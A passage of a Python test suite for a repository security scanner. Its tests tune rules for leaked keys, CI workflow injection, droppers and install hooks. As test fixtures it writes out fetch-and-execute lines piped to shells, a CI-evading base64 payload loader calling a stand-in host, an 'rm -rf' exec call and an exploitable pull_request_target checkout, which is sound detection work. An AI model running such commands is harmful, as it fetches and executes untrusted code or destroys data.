    """`stacksimplify/terraform-on-aws-eks` commits one RSA private key into 179
    directories, one per lesson, and a second into twelve more: 191 findings about two
    keys. `stacksimplify/terraform-on-aws-ec2` keeps `BACKUP-BEFORE-DEC2023-UPDATES/`
    and `V1-UPDATES-DEC2023/` beside the current material, so everything in it is
    reported twice.

    A reader needs one finding and a count. There is one key to rotate, not 179.

    The narrowest part of this is the evidence kind. Only `EvidenceKind.HASH` collapses,
    where the hash IS the thing found -- a credential's bytes, a file's leading bytes.
    Snippet evidence quotes a construct, so `cidr_blocks = ["0.0.0.0/0"]` hashes the
    same in a hundred unrelated modules and `eval(` the same in fifty unrelated files,
    and collapsing those would claim fifty independent problems were one. That version
    was written first and this project's own suite refused it: two tests that write the
    same payload to two paths, to prove a point about path selection, started seeing one
    finding.
    """

    KEY = assemble(
        "-----BEGIN RSA ",
        "PRIVATE KEY-----\n",
        "MIIEogIBAAKCAQEApzGQY8ArzFscOCT1b8TXURrlIRJwETKfbEKo4frXrXj1MCti\n",
        "-----END RSA ",
        "PRIVATE KEY-----\n",
    )

    def test_one_key_in_many_directories_is_one_finding(self, tmp_path) -> None:
        for index in range(6):
            directory = tmp_path / f"{index:02d}-lesson" / "private-key"
            directory.mkdir(parents=True)
            (directory / "terraform-key.pem").write_text(self.KEY)
        keys = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert len(keys) == 1
        assert "identical in 6 places" in keys[0].message
        assert ("copies", "6") in keys[0].evidence.metadata

    def test_two_keys_are_two_findings(self, tmp_path) -> None:
        """And this is the test that shaped the grouping key. Every 2048-bit RSA key
        begins `MIIEogIBAAKC`, and the private-key rule matches the PEM header plus
        twelve characters of body -- so grouping by the matched VALUE made two distinct
        keys one finding. Grouping by the file's own hash does not."""
        for index, tail in enumerate(("MCti", "MCtj")):
            directory = tmp_path / f"{index:02d}-lesson"
            directory.mkdir()
            (directory / "key.pem").write_text(self.KEY.replace("MCti", tail))
        keys = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert len(keys) == 2

    def test_two_matches_in_one_file_are_left_alone(self, tmp_path) -> None:
        """Collapsing within a file would throw away the line numbers, and a file with
        two copies of a key is a different question from two files with one."""
        (tmp_path / "keys.pem").write_text(self.KEY + "\n" + self.KEY)
        keys = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert len(keys) >= 1

    def test_independent_findings_are_not_collapsed(self, tmp_path) -> None:
        """The guard that shaped the rule. Three unrelated modules with the same
        one-line mistake are three things to fix, and their evidence is a snippet."""
        for index in range(3):
            directory = tmp_path / f"module-{index}"
            directory.mkdir()
            (directory / "main.tf").write_text(
                f'resource "aws_security_group" "x{index}" {{\n'
                "  ingress {\n"
                '    cidr_blocks = ["0.0.0.0/0"]\n'
                "  }\n}\n"
            )
        ingress = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.IAC.PUBLIC_INGRESS.001"
        ]
        assert len(ingress) == 3


class TestPullRequestTargetIsNotContributorCode:
    """`apache/beam` produced 106 blocking findings and 71 were one rule, once per
    workflow. Every Beam post-commit suite is triggered by `pull_request_target` so a
    committer can run it against a contributor's branch, and every one uses
    `actions/cache` and `actions/upload-artifact`. None of them checks out the pull
    request head.

    `pull_request_target` on its own does not run contributor code -- that is why the
    trigger exists, and `actions/checkout` defaults to the BASE ref there. What is
    exploitable is checking out the head and then running it, which is the correction
    `SUSPECT.CI.PR_TARGET.001` already carried. The rule next to it never got it.
    """

    @staticmethod
    def reports(body: bytes) -> bool:
        from cordon_scanner.detect.config_files import RULES

        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CI.ARTIFACT_POISONING.001")
        return bool(rule.pattern.search(body))

    SAFE = (
        b"on:\n  pull_request_target:\n    branches: ['master']\n"
        b"jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n"
        b"      - uses: actions/checkout@v4\n"
        b"      - uses: actions/cache@v4\n        with:\n          path: ~/.gradle\n"
        b"      - uses: actions/upload-artifact@v7\n"
    )

    EXPLOITABLE = (
        b"on:\n  pull_request_target:\n"
        b"jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
        b"      - uses: actions/checkout@v4\n        with:\n"
        b"          ref: ${{ github.event.pull_request.head.sha }}\n"
        b"      - run: make build\n"
        b"      - uses: actions/cache@v4\n"
    )

    def test_a_base_ref_checkout_is_not_reported(self) -> None:
        assert not self.reports(self.SAFE)

    def test_a_head_ref_checkout_is(self) -> None:
        assert self.reports(self.EXPLOITABLE)

    def test_head_ref_by_branch_name_counts(self) -> None:
        assert self.reports(
            self.EXPLOITABLE.replace(
                b"${{ github.event.pull_request.head.sha }}", b"${{ github.head_ref }}"
            )
        )


class TestADirectoryOfKeysIsACorpus:
    """OpenSSL ships eleven private keys in `apps/` -- `ca-key.pem`, `pca-key.pem`,
    `privkey.pem`, `s512-key.pem`, `rsa8192.pem` and the rest -- and has since the
    1990s. They are in every release tarball and vendored into Node, Python and most of
    the internet. Metasploit ships thirty under `data/exploits/CVE-2023-34039/`, one per
    affected appliance version, because the vulnerability IS that the vendor shipped
    them. MongoDB keeps twenty-eight under `x509/static/`.

    Eleven CRITICAL findings is not how to tell a reader that. One finding naming the
    directory and the count is, and it is also what they would act on.

    The threshold is what makes it safe: one or two keys in a directory is what a leak
    looks like, and those are untouched.
    """

    KEY = assemble(
        "-----BEGIN RSA ",
        "PRIVATE KEY-----\n",
        "MIIEogIBAAKCAQEApzGQY8ArzFscOCT1b8TXURrlIRJwETKfbEKo4frXrXj1MCti\n",
        "-----END RSA ",
        "PRIVATE KEY-----\n",
    )

    def write(self, directory, names) -> None:
        directory.mkdir(parents=True, exist_ok=True)
        for index, name in enumerate(names):
            (directory / name).write_text(self.KEY.replace("MCti", f"MC{index:02d}"))

    @staticmethod
    def keys(root):
        return [f for f in Scanner().scan(root).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"]

    def test_a_hierarchy_is_one_ceilinged_finding(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        self.write(
            tmp_path / "apps",
            ("ca-key.pem", "pca-key.pem", "privkey.pem", "s512-key.pem", "rsa8192.pem"),
        )
        found = self.keys(tmp_path)
        assert len(found) == 1
        assert found[0].severity <= Severity.MEDIUM
        assert "holds 5 private keys" in found[0].message
        assert ("keys_in_directory", "5") in found[0].evidence.metadata

    def test_a_deployed_key_beside_it_is_untouched(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        self.write(
            tmp_path / "apps",
            ("ca-key.pem", "pca-key.pem", "privkey.pem", "s512-key.pem", "rsa8192.pem"),
        )
        deploy = tmp_path / "deploy"
        deploy.mkdir()
        (deploy / "server.key").write_text(self.KEY.replace("MCti", "MCzz"))
        severities = {f.location.path: f.severity for f in self.keys(tmp_path)}
        assert severities["deploy/server.key"] >= Severity.HIGH

    @pytest.mark.parametrize("count", [1, 2, 4])
    def test_below_the_threshold_nothing_changes(self, tmp_path, count: int) -> None:
        from cordon_scanner.core.models import Severity

        self.write(tmp_path / "deploy", [f"server{index}.key" for index in range(count)])
        found = self.keys(tmp_path)
        assert len(found) == count
        assert all(f.severity >= Severity.HIGH for f in found)


class TestAWordIsNotKeyMaterial:
    """Two shapes the long-run guard refused, both from the second pass.

    Kubernetes names every controller `serviceaccount-token-controller` and
    Elasticsearch declares `DEFAULT_PASS_PHRASE = "elasticsearch-license"`; the guard
    objects because `elasticsearch` is thirteen lowercase characters, and it cannot tell
    a word from a padded run. ASP.NET Core declares
    `MSAspNetCoreWinAuthToken = "MS-ASPNETCORE-WINAUTHTOKEN"`, where the objection is
    `WINAUTHTOKEN` being twelve capitals.

    The distinction that holds: generated key material is base64, base62 or hex, so it
    has digits or mixed case or both. A value that is lowercase and separators, or
    capitals and separators, is something somebody typed -- and
    `glpat-AAAAAAAAAAAAAAAA` mixes case, which neither form admits, so the test that
    exists for it keeps passing.
    """

    @pytest.mark.parametrize(
        "value",
        [
            b"serviceaccount-token-controller",
            b"elasticsearch-license",
            b"MS-ASPNETCORE-WINAUTHTOKEN",
            b"HTTP_X_FORWARDED_FOR",
            b"my-service-account-name",
            b"content.security.policy",
        ],
    )
    def test_a_typed_phrase_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is not None

    @pytest.mark.parametrize(
        "value",
        [
            b"glpat-AAAAAAAAAAAAAAAA",
            b"aB3kQ9mZ2xT7vL4nR8wY",
            b"S3cr3tP4ssw0rdXyz9Qq",
            b"dbw2OtmVEeuUvIptb1Coyg",
            b"SW2YcwTIb9zpOOhoPsMm",
        ],
    )
    def test_key_material_is(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is None


class TestGatingOnCiIsWhatPrepareScriptsDo:
    """`SUSPECT.ANTI_ANALYSIS.001` was 70 findings across 49 of the first 547
    repositories and the common shape was an npm `prepare` script:

        if (process.env.CI || process.env.DOCKER_BUILD) { process.exit(0) }
        execSync('husky install')

    An environment check and a process start. The check itself is genuinely a
    capability -- the primitive's own positive test is `if os.environ.get('CI'): return`,
    which is both the husky idiom and the textbook install-hook evasion, written
    identically -- so nothing in the FORM tells them apart and the composite has to ask
    what else the file does. Decoding something or reaching the network is a payload
    worth gating. Starting a process is what build tooling does.

    And PyTorch re-exports thirteen names with `globals()[name] = getattr(...)`, which
    is a write into a namespace rather than a reach into one.
    """

    def test_a_prepare_script_is_quiet(self, tmp_path) -> None:
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "prepare.mjs").write_bytes(
            b"import { execSync } from 'node:child_process'\n"
            b"if (process.env.CI || process.env.DOCKER_BUILD) { process.exit(0) }\n"
            b"execSync('husky install')\n"
        )
        assert "SUSPECT.ANTI_ANALYSIS.001" not in flagged(tmp_path)

    def test_the_same_check_guarding_a_payload_is_not(self, tmp_path) -> None:
        scripts = tmp_path / "agent"
        scripts.mkdir()
        (scripts / "boot.py").write_bytes(
            assemble(
                "import os, base64, urllib.request\n",
                "if os.environ.get('CI'):\n    raise SystemExit(0)\n",
                "blob = urllib.request.urlopen('https://x.test/p').read()\n",
                "exec(base64.b64decode(blob))\n",
            ).encode()
        )
        assert "SUSPECT.ANTI_ANALYSIS.001" in flagged(tmp_path)

    def test_a_write_into_globals_is_not_dispatch(self) -> None:
        from cordon_scanner.detect.pyast import PythonAnalyzer

        source = (
            "import torch\n"
            "for name in _names:\n"
            "    globals()[name] = getattr(torch._C._dynamo.eval_frame, name)\n"
        )
        assert not [
            h for h in PythonAnalyzer.analyse(source) if h.capability.name == "DYNAMIC_DISPATCH"
        ]

    def test_a_read_out_of_globals_still_is(self) -> None:
        from cordon_scanner.detect.pyast import PythonAnalyzer

        source = "def run(cmd):\n    return globals()[cmd]()\n"
        assert [
            h for h in PythonAnalyzer.analyse(source) if h.capability.name == "DYNAMIC_DISPATCH"
        ]


class TestACiScriptIsNotADropper:
    """`MALWARE.DROPPER.001` was 72 findings across 49 of the 1,427 repositories, and
    that is the most serious claim this tool makes: MALICIOUS, CRITICAL, with
    remediation telling the reader to treat the host as compromised.

    Its CI branch read `ci_hook` plus `egress` plus `execute`, which is what a CI script
    looks like. vLLM supplied seven: `run-benchmarks.sh` downloads a dataset from
    huggingface.co and runs `bash -c 'until curl localhost:8000/v1/models'`;
    `check-ray-compatibility.sh` asks whether a wheel index exists and runs a Python
    one-liner. Nothing downloaded is executed in either.

    The paragraph inside the rule describes what the branch was written for -- the
    Codecov uploader, `curl -s https://codecov.io/bash | bash` -- where the fetch and
    the execution are one act. That is `fetch_exec`, and the branch requires it now.
    The install-hook branch keeps the looser pair: there the hook IS the execution and
    it runs on a consumer's machine without being asked.

    Three more shapes from the same repository: a tool-existence probe, a package name,
    and a loopback health check written without a scheme.
    """

    def test_a_ci_script_that_fetches_and_runs_separately(self, tmp_path) -> None:
        flow = tmp_path / ".buildkite" / "scripts"
        flow.mkdir(parents=True)
        (flow / "run-benchmarks.sh").write_bytes(
            b"#!/bin/bash\n"
            b"(which wget && which curl) || (apt-get update && apt-get install -y wget curl)\n"
            b"wget https://huggingface.test/datasets/x/resolve/main/data.json\n"
            b"timeout 600 bash -c 'until curl localhost:8000/v1/models; do sleep 1; done'\n"
        )
        assert "MALWARE.DROPPER.001" not in flagged(tmp_path)

    def test_a_ci_script_that_pipes_a_fetch_into_a_shell(self, tmp_path) -> None:
        """The control, and the shape the branch exists for."""
        flow = tmp_path / ".buildkite" / "scripts"
        flow.mkdir(parents=True)
        (flow / "upload.sh").write_bytes(
            assemble("#!/bin/bash\n", "curl -s https://codecov.test/bash | bash\n").encode()
        )
        assert "MALWARE.DROPPER.001" in flagged(tmp_path)

    @pytest.mark.parametrize(
        ("line", "probe"),
        [
            (b"(which wget && which curl) || (apt-get install -y wget curl)", True),
            (b"if command -v curl > /dev/null; then", True),
            (b"apt-get install -y ca-certificates curl gnupg", True),
            (b"apk add --no-cache curl", True),
            (b"curl -fsSL https://x.test/p | sh", False),
            (b"which curl && curl https://x.test/p | sh", False),
        ],
    )
    def test_naming_a_tool_is_not_using_it(self, line: bytes, probe: bool) -> None:
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.detect.capability import CapabilityDetector

        raw = b"#!/bin/sh\n" + line + b"\n"
        content = FileContent(path="x.sh", raw=raw, size=len(raw))
        assert CapabilityDetector._is_tool_probe(content, raw.index(line)) is probe

    @pytest.mark.parametrize(
        ("line", "local"),
        [
            (b"timeout 600 bash -c 'until curl localhost:8000/v1/models; do sleep 1; done'", True),
            (b"curl -s 127.0.0.1:9090/health", True),
            (b"curl -X POST localhost:8000/v1/chat -d @-", True),
            (b'until curl -sf "http://127.0.0.1:\'"$port"\'/health"; do sleep 1; done', True),
            (b"curl -fsSL https://get.helm.test/install.sh | bash", False),
        ],
    )
    def test_a_schemeless_loopback_target_is_not_egress(self, line: bytes, local: bool) -> None:
        """`curl localhost:8000/v1/models` is how a CI script waits for the server it
        just started, and the URL pattern needed a scheme to see it. The quoted form is
        vLLM's, where the port sits on the other side of a shell quote and the capture
        ends in a bare colon."""
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.detect.capability import CapabilityDetector

        raw = b"#!/bin/sh\n" + line + b"\n"
        content = FileContent(path="x.sh", raw=raw, size=len(raw))
        assert CapabilityDetector._is_local_target(content, raw.index(line)) is local

    @pytest.mark.parametrize(
        ("line", "reported"),
        [
            (b"ARG SCCACHE_S3_NO_CREDENTIALS=0", False),
            (b"ENV SCCACHE_S3_NO_CREDENTIALS=${USE_SCCACHE:+${SCCACHE_S3_NO_CREDENTIALS}}", False),
            (b"ARG API_KEY=none", False),
            (b"ARG NPM_TOKEN=npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345", True),
        ],
    )
    def test_a_switch_is_not_a_secret(self, line: bytes, reported: bool) -> None:
        from cordon_scanner.detect.config_files import RULES

        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CONTAINER.BUILD_SECRET.001")
        assert bool(rule.pattern.search(line)) is reported


class TestATranslationIsNotACredential:
    """The documentation-path list already carried the case in a comment -- "the value
    beside a key called `password` is the WORD 'password' in another language: a Danish
    translation file was reported for `password = "Adgangskode"`" -- and then had one
    glob for it, `**/locales/**`.

    Keycloak keeps its catalogues under
    `theme/keycloak.v2/admin/messages/messages_de.properties` and ships dozens of
    languages. `resetPasswordConfirmation=Passwortbestätigung` was a credential finding,
    and 40 of its 61 remaining findings were that shape.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "js/apps/admin-ui/theme/keycloak.v2/admin/messages/messages_de.properties",
            "src/main/resources/i18n/messages_ja.properties",
            "app/translations/fr.json",
            "resources/lang/es/auth.php",
            "web/locale/pt_BR/strings.po",
        ],
    )
    def test_a_catalogue_is_documentation(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert is_documentation(path)

    @pytest.mark.parametrize(
        "path",
        [
            "src/main/resources/application.properties",
            "config/production.yml",
            "deploy/secrets.env",
        ],
    )
    def test_configuration_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert not is_documentation(path)

    def test_a_translated_password_label_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        messages = tmp_path / "theme" / "admin" / "messages"
        messages.mkdir(parents=True)
        (messages / "messages_de.properties").write_text(
            "resetPasswordConfirmation=Passwortbestätigung\n"
            "passwordNew=Passwort in Ordnung bringen\n",
            encoding="utf-8",
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert all(f.severity <= Severity.MEDIUM for f in secrets)


class TestThreeMoreValueShapes:
    """From the repositories that had exactly ONE finding left in the second pass, which
    is where the clean-repository rate is decided.

    Kafka builds a `toString()` out of `"DelegationTokenImage(" + String.join(...)`,
    which folds to a value that opens a call. `gkd-kit/gkd` declares
    `lsposed-hiddenapibypass = "org.lsposed.hiddenapibypass:hiddenapibypass:6.1"` in a
    Gradle version catalogue, which is a coordinate. GORM starts SQL Server in CI with
    `MSSQL_SA_PASSWORD: LoremIpsum86`, which is filler text.
    """

    @pytest.mark.parametrize(
        "value",
        [
            b"DelegationTokenImage(",
            b"String.join(parts)",
            b"org.lsposed.hiddenapibypass:hiddenapibypass:6.1",
            b"com.squareup.okhttp3:okhttp:4.12.0",
            b"redis://localhost:6379:0",
        ],
    )
    def test_code_and_coordinates(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value) is not None

    def test_filler_text(self) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(b"LoremIpsum86") is not None

    @pytest.mark.parametrize(
        "value",
        [
            # The Codecov token etcd commits. Real, and still reported.
            b"6040de41-c073-4d6f-bbf8-d89256ef31e1",
            b"dbw2OtmVEeuUvIptb1Coyg",
            b"SW2YcwTIb9zpOOhoPsMm",
            # The suite's own stand-in for a real credential, which three tests
            # depend on not being dismissed.
            b"hunter2Sup3rSecretV",
        ],
    )
    def test_these_are_still_credentials(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert NOT_A_SECRET.match(value) is None
        assert PLACEHOLDER.search(value) is None


class TestVendoredCodeIsSomebodyElsesSource:
    """The manifest detector has asked since the beginning whether a `package.json`
    belongs to an installed dependency. The content detectors never did, so a finding in
    vendored source was graded as though this repository had written it.

    Homebrew vendors the `plist` gem under
    `Library/Homebrew/vendor/bundle/ruby/4.0.0/gems/plist-3.7.2/`, whose XML parser
    decodes base64 and evaluates -- which is what a plist parser does, and it was
    Homebrew's only remaining blocking finding. Node vendors OpenSSL under `deps/`,
    including its demo keys; Moby vendors a hundred Go modules under `vendor/`.

    A ceiling rather than an exemption, because vendored code is exactly where a
    supply-chain attack lands.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "Library/Homebrew/vendor/bundle/ruby/4.0.0/gems/plist-3.7.2/lib/plist/parser.rb",
            "deps/openssl/openssl/apps/ca-key.pem",
            "vendor/github.com/digitorus/pkcs7/verify_test_dsa.go",
            "third_party/xla/xla/service/gpu/x.py",
            "Pods/Alamofire/Source/Request.swift",
        ],
    )
    def test_these_are_vendored(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_vendored

        assert is_vendored(path)

    @pytest.mark.parametrize(
        "path",
        [
            "src/main/java/App.java",
            "lib/plist/parser.rb",
            "internal/route/repo/http.go",
        ],
    )
    def test_these_are_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_vendored

        assert not is_vendored(path)

    def test_a_credential_in_a_vendored_gem_is_ceilinged(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        gem = tmp_path / "vendor" / "bundle" / "ruby" / "gems" / "thing-1.0" / "lib"
        gem.mkdir(parents=True)
        (gem / "client.rb").write_bytes(
            ("API_TOKEN = " + repr(assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI")) + "\n").encode()
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert secrets, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in secrets)

    def test_the_same_file_in_the_project_is_not(self, tmp_path) -> None:
        from cordon_scanner.core.models import Severity

        lib = tmp_path / "lib"
        lib.mkdir()
        (lib / "client.rb").write_bytes(
            ("API_TOKEN = " + repr(assemble("9aG4bV2xQ8zL", "5tR7wY1uE3oI")) + "\n").encode()
        )
        secrets = [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]
        assert secrets and any(f.severity >= Severity.HIGH for f in secrets)


class TestDefiningANameIsNotUsingIt:
    """Three one-finding repositories, three shapes.

    `google/zx` exports a function called `fetch`, and the egress pattern matched the
    definition: `export function fetch(` was that repository's only blocking finding.
    Tailwind declares `exec(command: string, options?: Options): Promise<string>` on an
    interface -- a call passes values, and `name: Type` in the parentheses is a
    signature.

    nlohmann writes `echo ${{ github.event.pull_request.user.login }} > ./pr/author` and
    Astro writes the same field into a comment body. A GitHub login is validated to
    alphanumerics and single hyphens, so there is nothing to inject; a title or a body
    can carry anything, and those stay.

    TrafficMonitor writes `version_info.find(L"\\ufeff<version>")` to strip a byte-order
    mark out of a downloaded file -- a string that BEGINS with one is code handling it,
    which is the reasoning `_is_lone_quoted_mark` already applies to a quoted override.
    """

    @staticmethod
    def declared(line: bytes, needle: bytes) -> bool:
        from cordon_scanner.core.content import FileContent
        from cordon_scanner.detect.capability import CapabilityDetector

        raw = b"// file\n" + line + b"\n"
        content = FileContent(path="x.ts", raw=raw, size=len(raw))
        start = raw.index(needle)
        return CapabilityDetector._is_declaration(content, start, start + len(needle))

    @pytest.mark.parametrize(
        ("line", "needle"),
        [
            (b"export function fetch(url: string) {", b"fetch("),
            (b"  exec(command: string, options?: Options): Promise<string>", b"exec("),
            (b"  spawn(cmd: string, args: string[]): ChildProcess", b"spawn("),
            (b"async function exec(cmd) {", b"exec("),
            (b"def exec(self, cmd):", b"exec("),
        ],
    )
    def test_a_definition(self, line: bytes, needle: bytes) -> None:
        assert self.declared(line, needle)

    @pytest.mark.parametrize(
        ("line", "needle"),
        [
            (b"const r = await fetch('https://x.test/a')", b"fetch("),
            (b"  execSync('npm run build')", b"execSync("),
            (b"exec(`rm -rf ${dir}`)", b"exec("),
        ],
    )
    def test_a_call(self, line: bytes, needle: bytes) -> None:
        assert not self.declared(line, needle)

    def test_a_login_cannot_inject(self, tmp_path) -> None:
        flow = tmp_path / ".github" / "workflows"
        flow.mkdir(parents=True)
        (flow / "author.yml").write_bytes(
            b"on:\n  pull_request_target:\njobs:\n  a:\n    steps:\n"
            b"      - run: echo ${{ github.event.pull_request.user.login }} > ./pr/author\n"
        )
        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" not in flagged(tmp_path)

    def test_a_title_still_can(self, tmp_path) -> None:
        flow = tmp_path / ".github" / "workflows"
        flow.mkdir(parents=True)
        (flow / "title.yml").write_bytes(
            b"on:\n  pull_request_target:\njobs:\n  a:\n    steps:\n"
            b"      - run: echo ${{ github.event.pull_request.title }} > ./pr/title\n"
        )
        assert "SUSPECT.CI.EXPRESSION_INJECTION.001" in flagged(tmp_path)


class TestOneDecisionAppliedSixHundredTimes:
    """`community-scripts/ProxmoxVE` ships about six hundred container install scripts
    and every one opens the same way: source a bootstrap function from the `main` branch
    of a GitHub repository. 601 of its 618 dropper findings carried a byte-identical
    snippet and 97 of its 98 persistence findings carried another -- 729 blocking
    findings in total, the largest count in the 1,427-repository corpus, and the one
    number no fix had moved all session.

    It is a real finding: what runs at install time is whatever that branch holds. It is
    also ONE thing to change, in the generator that writes those scripts. So it is
    reported once, with the count and the first few paths in the message.

    Two conditions keep this away from independent findings: ten or more distinct files,
    and a snippet long enough that ten identical copies cannot be coincidence.
    """

    IDIOM = (
        b'_cs_boot="${COMMUNITY_SCRIPTS_CORE_DIR:-$(dirname "${BASH_SOURCE[0]}")/../../core}"\n'
        b'source "$_cs_boot" 2>/dev/null || source <(curl -fsSL '
        b'"https://raw.githubusercontent.test/community-scripts/core/main/core/build.func")\n'
    )

    def test_six_hundred_copies_are_one_finding(self, tmp_path) -> None:
        scripts = tmp_path / "ct"
        scripts.mkdir()
        for index in range(14):
            (scripts / f"app{index:02d}.sh").write_bytes(
                b"#!/usr/bin/env bash\n" + self.IDIOM + f'APP="App{index}"\n'.encode()
            )
        droppers = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.DROPPER.001"
        ]
        assert len(droppers) == 1
        assert "appears in 14 files" in droppers[0].message
        assert ("occurrences", "14") in droppers[0].evidence.metadata

    def test_nine_copies_are_nine_findings(self, tmp_path) -> None:
        """The threshold, asserted from below. Nine copies of a construct is still nine
        places somebody has to look, and the line between "a repeated decision" and "a
        handful of mistakes" has to be drawn somewhere this test can see."""
        scripts = tmp_path / "ct"
        scripts.mkdir()
        for index in range(9):
            (scripts / f"app{index:02d}.sh").write_bytes(
                b"#!/usr/bin/env bash\n" + self.IDIOM + f'APP="App{index}"\n'.encode()
            )
        droppers = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SUSPECT.DROPPER.001"
        ]
        assert len(droppers) == 9

    def test_a_short_construct_is_never_collapsed(self, tmp_path) -> None:
        """`cidr_blocks = ["0.0.0.0/0"]` is twenty-seven bytes and hashes the same in a
        hundred unrelated modules. Fifteen of those are fifteen security groups."""
        for index in range(15):
            module = tmp_path / f"module-{index:02d}"
            module.mkdir()
            (module / "main.tf").write_text(
                f'resource "aws_security_group" "x{index}" {{\n'
                "  ingress {\n"
                '    cidr_blocks = ["0.0.0.0/0"]\n'
                "  }\n}\n"
            )
        ingress = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.IAC.PUBLIC_INGRESS.001"
        ]
        assert len(ingress) == 15


class TestAPackageManagerTestsItsOwnInstaller:
    """`pnpm/pnpm` carries `exec/lifecycle/test/fixtures/*/package.json`: little packages
    that exist to be installed by the test suite of the code that runs install hooks.
    One of them declares `prepare`, `preinstall`, `install` and `postinstall`, each
    running `node -e "console.log('install')"` so the test can assert the order they
    fire in. Sixteen HIGH findings across four fixtures, every one of them about input
    to a test.

    The manifest detector was the last one without the fixture ceiling, on the
    assumption that a manifest is never test material. A package manager's test suite is
    the counterexample, and it is the project most likely to be scanned by this tool.
    """

    FIXTURE = (
        b"{\n"
        b'  "name": "with-many-scripts",\n'
        b'  "version": "1.0.0",\n'
        b'  "scripts": {\n'
        b'    "prepare": "node -e \\"console.log(\'prepare\')\\"",\n'
        b'    "preinstall": "node -e \\"console.log(\'preinstall\')\\"",\n'
        b'    "install": "node -e \\"console.log(\'install\')\\"",\n'
        b'    "postinstall": "node -e \\"console.log(\'postinstall\')\\""\n'
        b"  }\n"
        b"}\n"
    )

    def test_fixture_manifests_do_not_block(self, tmp_path) -> None:
        fixture = tmp_path / "exec" / "lifecycle" / "test" / "fixtures" / "with-many-scripts"
        fixture.mkdir(parents=True)
        (fixture / "package.json").write_bytes(self.FIXTURE)
        findings = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.INSTALL.SCRIPT.001"
        ]
        assert findings, "the fixture is still reported, only lower"
        assert not [f for f in findings if f.severity >= Severity.HIGH]
        assert all("test material" in f.message for f in findings)

    def test_the_same_manifest_at_the_root_still_blocks(self, tmp_path) -> None:
        """The control. Move the identical file out of the fixture tree and it is a
        package that runs four scripts on every install."""
        (tmp_path / "package.json").write_bytes(self.FIXTURE)
        findings = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.INSTALL.SCRIPT.001"
        ]
        assert [f for f in findings if f.severity >= Severity.HIGH]


class TestAValueEndingInAColonIsAFieldName:
    """`gorhill/uBlock`'s MV3 rule editor completes a YAML-ish rule syntax, so it carries
    a table of what may follow what: nineteen entries of the form
    `{ token: 'excludedRequestDomains:', after: '\\n    - ' }`. The key is `token`
    because that is what a parser calls the thing it is completing, and the value is the
    field name it would insert. Nineteen HIGH credential findings in one file, all of
    them the same shape.

    No credential format ends in a colon. base64 pads with `=`, base62 and hex carry no
    punctuation, and every provider prefix puts its separator in the middle. A trailing
    colon says the value names something.
    """

    TABLE = (
        "const candidates = [\n"
        "    { token: 'isUrlFilterCaseSensitive:', after: ' ' },\n"
        "    { token: 'excludedInitiatorDomains:', after: ' ' },\n"
        "    { token: 'excludedResourceTypes:', after: ' ' },\n"
        "];\n"
    )

    def test_the_completion_table_is_not_a_credential_store(self, tmp_path) -> None:
        (tmp_path / "editor.js").write_text(self.TABLE)
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_a_key_with_a_colon_in_the_middle_is_still_reported(self, tmp_path) -> None:
        """The control, and the reason the rule is about the LAST character: a provider
        prefix is a separator in the middle of real key material."""
        (tmp_path / "config.js").write_text(
            "const token = 'glpat-REDACTEDnotatoken';\n"
            "const other = 'ghp_EXAMPLEONLYnotarealkey00000000000at';\n"
        )
        assert [f for f in Scanner().scan(tmp_path).findings if f.rule_id.startswith("SECRET.")]


class TestFourShapesFromOneIntegrationTree:
    """`home-assistant/core` carries about twelve hundred integrations, each written by a
    different volunteer against a different vendor's API, and its nineteen findings were
    nineteen different ways of writing something that is not a credential. Four shapes
    covered eighteen of them, and the nineteenth is real and stays.
    """

    def test_a_pem_armour_line_holds_no_key(self, tmp_path) -> None:
        """The WeatherKit config flow repairs a pasted key by checking its delimiters.
        The armour is the one part of a PEM file that is identical in every key ever
        generated, so any code that parses, writes or validates PEM has both lines in it
        as literals."""
        (tmp_path / "config_flow.py").write_text(
            "def _repair(key_input: str) -> str:\n"
